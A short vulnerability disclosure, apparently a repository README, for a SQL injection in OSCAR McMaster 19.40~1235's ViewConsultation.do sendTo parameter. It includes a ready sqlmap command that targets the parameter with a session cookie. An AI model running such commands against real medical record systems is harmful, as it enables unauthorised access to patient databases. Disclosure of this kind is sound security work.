# CVE-2021-40512 OSCAR McMaster 19.40~1235 SQL Injection Vulnerability

A SQL injection vulnerability exists in version 19.40~1235 of OSCAR McMaster. A malicious attacker can issue SQL commands to the MySQL/MariaDB database through the vulnerable sendTo parameter located on the /oscar/oscarEncounter/ViewConsultation.do endpoint.

[Placeholder for cve.mitre]

[Placeholder for nist]

Vulnerable JSP Page:

ViewConsultation.do - sendTo parameter

Vulnerable Payload:

sqlmap -u "/oscar/oscarEncounter/ViewConsultation.do?sendTo=&startDate=&endDate=&searchDate=0&currentTeam=&orderby=2&desc=0&offset=&limit=100&mrpNo=&patientId=&serviceFilter=&consultantFilter=&urgencyFilter=" --cookie=<COOKIE> -p sendTo --banner

Discovered by Jack McBride, August 2021
